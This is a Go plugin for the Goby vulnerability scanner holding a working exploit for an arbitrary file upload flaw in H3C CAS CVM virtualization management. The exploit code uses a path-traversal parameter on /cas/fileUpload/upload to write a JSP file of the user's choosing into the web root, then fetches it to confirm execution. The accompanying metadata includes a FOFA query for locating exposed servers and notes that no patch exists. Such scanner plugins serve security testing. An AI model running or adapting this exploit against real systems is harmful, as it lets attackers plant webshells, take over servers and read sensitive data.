package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "H3C CVM Arbitrary File Upload Vulnerability",
    "Description": "<p>H3C company relies on its strong technical strength, product and service advantages, as well as the popular customer-centric concept to provide optimized virtualization and cloud business operation solutions for the IAAs cloud computing infrastructure of enterprise data center. Through the H3C CAS CVM virtualization management system, we can realize the central management and control of the virtualized environment in the data center. With a simple management interface, we can uniformly manage all physical and virtual resources in the data center, which can not only improve the management and control ability of administrators, simplify daily routine work, but also reduce the complexity and management cost of the IT environment.</p><p>H3C-CVM has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</p>",
    "Impact": "H3C CVM Arbitrary File Upload Vulnerability",
    "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"http://www.h3c.com/cn/Service/Document_Software/Software_Download/H3Cloud/Catalog/Cloud_Virtualization/CAS_CVM/\">http://www.h3c.com/cn/Service/Document_Software/Software_Download/H3Cloud/Catalog/Cloud_Virtualization/CAS_CVM/</a></p>",
    "Product": "H3C-CVM",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "H3C CVM 前台任意文件上传漏洞",
            "Description": "<p>H3C 公司依托其强大的技术实力、 产品与服务优势， 以及深入人心的以客户为中心的理念， 为企业数据中心 IaaS 云计算基础架构 提供最优化的虚拟化与云业务运营解决方案。 通过 H3C CAS CVM 虚拟化管理系统实现数据中心虚拟化环境的中央管理控制， 以 简洁的管理界面， 统一管理数据中心内所有的物理资源和虚拟资源， 不仅能提高管理员的管控能力、 简化日常例行工作， 更可降低 IT 环境的复杂度和管理成本。<br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">H3C CVM&nbsp;存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">H3C CVM</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">&nbsp;</span>存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。</span><br></p>",
            "Recommendation": "<p>目前官方尚未发布安全补丁，请关注厂商更新。<a href=\"http://www.h3c.com/cn/Service/Document_Software/Software_Download/H3Cloud/Catalog/Cloud_Virtualization/CAS_CVM/\" target=\"_blank\">http://www.h3c.com/cn/Service/Document_Software/Software_Download/H3Cloud/Catalog/Cloud_Virtualization/CAS_CVM/</a><br></p>",
            "Product": "H3C-CVM",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "H3C CVM Arbitrary File Upload Vulnerability",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">H3C company relies on its strong technical strength, product and service advantages, as well as the popular customer-centric concept to provide optimized virtualization and cloud business operation solutions for the IAAs cloud computing infrastructure of enterprise data center. Through the H3C CAS CVM virtualization management system, we can realize the central management and control of the virtualized environment in the data center. With a simple management interface, we can uniformly manage all physical and virtual resources in the data center, which can not only improve the management and control ability of administrators, simplify daily routine work, but also reduce the complexity and management cost of the IT environment.</span></p><p><span style=\"color: var(--primaryFont-color);\">H3C-CVM has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</span><br></p>",
            "Impact": "H3C CVM Arbitrary File Upload Vulnerability",
            "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"http://www.h3c.com/cn/Service/Document_Software/Software_Download/H3Cloud/Catalog/Cloud_Virtualization/CAS_CVM/\" target=\"_blank\">http://www.h3c.com/cn/Service/Document_Software/Software_Download/H3Cloud/Catalog/Cloud_Virtualization/CAS_CVM/</a><br></p>",
            "Product": "H3C-CVM",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": " server=\"H3C-CVM\" || (banner=\"H3C-CVM\" && banner=\"Server: \")",
    "GobyQuery": " server=\"H3C-CVM\" || (banner=\"H3C-CVM\" && banner=\"Server: \")",
    "Author": "su18@javaweb.org",
    "Homepage": "http://www.h3c.com/cn/Service/Document_Software/Software_Download/H3Cloud/Catalog/Cloud_Virtualization/CAS_CVM/",
    "DisclosureDate": "2022-05-25",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "fileName",
            "type": "input",
            "value": "evil",
            "show": ""
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "<%out.println(\"123\");%>",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "7093"
}`

	exploitUploadFile2398429842 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewPostRequestConfig("/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/" + fileName + ".jsp&name=222")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-range", "bytes 0-10/20")
		requestConfig.Header.Store("Referer", "http://"+host.HostInfo+"/cas/login")
		requestConfig.Data = fileContent
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "\"success\\\":true") {
				return true
			}
		}
		return false
	}
	checkUploadFile12312313810923 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/" + fileName)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fileContent)
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rand := goutils.RandomHexString(6)
			rand2 := goutils.RandomHexString(6)
			if exploitUploadFile2398429842(rand2, "<%out.print(\""+rand+"\");%>", u) {
				return checkUploadFile12312313810923("/cas/js/lib/buttons/"+rand2+".jsp", rand, u)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileContent := ss.Params["fileContent"].(string)
			fileName := ss.Params["fileName"].(string)
			if exploitUploadFile2398429842(fileName, fileContent, expResult.HostInfo) {
				expResult.Success = true
				expResult.Output = "文件上传已成功，请检查路径：/cas/js/lib/buttons/" + fileName + ".jsp"
			}
			return expResult
		},
	))
}
